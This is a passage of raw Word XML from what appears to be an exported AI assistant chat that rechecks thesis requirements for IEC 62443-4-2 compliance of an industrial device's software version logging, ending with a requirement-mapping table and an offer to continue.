        <w:t>Kept the citation caution</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — prEN 50742 §7.3.1 remains </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unverified and flagged</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; the non-conformity rests on the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>device facts (G-1/G-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not the draft clause. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>HYPERLINK "https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>Txt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="216E454E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 xml:space="preserve">Corrected verdict, tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-013 = retain a per-upload safety-software version log for 5 years — not met on the device</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: only the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>current</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> version is exposed (CR 6.1 partial), no </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>per-upload history</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is retained (G-1), and uploads are </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>undatable</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-2, decisive) — with </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>general-log retention</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>upload event</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>manufacturer-side-record normative question</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> explicitly flagged.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E658419" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097">
        <w:pict w14:anchorId="0FF86CEF">
          <v:rect id="_x0000_i1884" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="378986DA" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Scope-boundary recheck — status (13 of 14 rechecked; only RQ-014 remains)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455"/>
        <w:gridCol w:w="5177"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="69EF2A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0735E2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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs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AAED07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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097"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53FBCA" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Corrected</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>boundary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="471ACF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3D9012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Identify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CBEC8" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>RQ-004, RQ-006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FD9FE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 xml:space="preserve">Completeness + confidentiality; </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>integrity</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-005; </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>change-count</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="2B43E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C9166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Protect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2F223" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>RQ-002, RQ-005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FFAC3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i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> → RQ-003; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>authorization</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> → RQ-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="21376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05FBC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Authorize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5A34A" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>RQ-011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60841" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Update-gate/EoP + unauthenticated-DCP; learning-phase = N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="73F2D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E980C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Collect</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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BF50E" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>RQ-003, RQ-008, RQ-009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4D4C2" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>REVISION_COUNTER/I&amp;M4 in RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="79D38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4F871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lastRenderedPageBreak/>
              <w:t>Retain</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>restrict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BD2F5" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">RQ-012 </w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>RQ-013</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA4097">
              <w:t>, RQ-014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8B48E" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">RQ-012 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>general</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">; RQ-013 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">-per-upload; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>access</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> → RQ-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="3F527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47A57" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Withstand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62A5A" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>RQ-001, RQ-010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3BB3A" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>Flood/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>DoS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>fuzz</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> in RQ-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="597AB88F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 xml:space="preserve">Only </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (access restriction / the audit paradox) remains to complete the full-set recheck.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54071FF0" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to**(a)** recheck </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> now to finish the set, or**(b)** proceed directly to </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>compiling the fully corrected RQ-001 → RQ-014 into the consolidated thesis appendix</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (I'd recheck RQ-014 first as part of that build)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BD3728" w14:textId="77777777" w:rsidR="00A366E1" w:rsidRDefault="00A366E1" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="029C72CE" w14:textId="77777777" w:rsidR="00A366E1" w:rsidRDefault="00A366E1" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A39D607" w14:textId="77777777" w:rsidR="00A366E1" w:rsidRDefault="00A366E1" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B25F642" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40653B14" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18D6FF38" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="116A63C8" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FAA0E75" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05AC9590" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16C4BDE5" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18F3E960" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="799FAA2B" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06B63070" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C2B533D" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E8A716C" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C0759AA" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A15F2B6" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14FCCA76" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C099616" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="058542CC" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CCD1FA5" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A2341DC" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="370C57B8" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38142760" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E7C0134" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22ABF489" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22300A97" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A86AC4A" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79A613BD" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65A95D8C" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E52823F" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17646C3B" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38DD3849" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
